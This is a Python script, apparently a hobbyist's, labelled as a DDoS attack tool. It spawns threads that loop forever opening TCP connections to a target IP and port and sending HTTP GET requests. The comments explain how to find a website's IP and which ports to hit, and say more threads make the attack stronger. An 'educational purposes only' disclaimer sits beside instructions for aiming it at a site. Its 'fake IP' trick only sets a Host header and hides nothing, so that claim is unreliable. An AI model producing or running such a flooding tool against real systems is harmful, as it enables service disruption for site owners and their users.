#DDOS Attack Script

import socket
import threading

# Target IP and Port to attack
# How to find your target IP and Port?
# 1. Open Command Prompt
# 2. Type 'ping www.yourtarget.com' or ipconfig (for your own IP). In ipconfig, look for 'Default Gateway' (Router IP) or 'IPv4 Address' (Your IP)
# 3. Copy the IP Address

# Note: It is illegal to attack a website without permission. This script is for educational purposes only.
# I am not responsible for any damage caused by this script.
# Use it at your own risk.

target = '192.168.29.34'

# Which port number to attack?
# 80 is the default port for HTTP
# 443 is the default port for HTTPS
# 21 is the default port for FTP
# 22 is the default port for SSH

target_port = 80

# Fake IP Address to hide your identity (optional)
# Note: Just because you are using a fake IP, it doesn't mean you are untraceable.

fake_ip = '182.21.20.32'

# Number of threads to run
# The more threads, the more powerful the attack
# But, it can also crash your own computer or network
# So, be careful

# Number of threads that are already connected
already_connected = 0

threads = 5

# Create a socket
# AF_INET = Address Family (IPv4)
# SOCK_STREAM = Connection-Oriented Protocol (TCP)

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, target_port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, target_port))
        s.close()
        
        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected)
    
for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
    
# This is not a efficient way to attack a website because it is a simple GET request.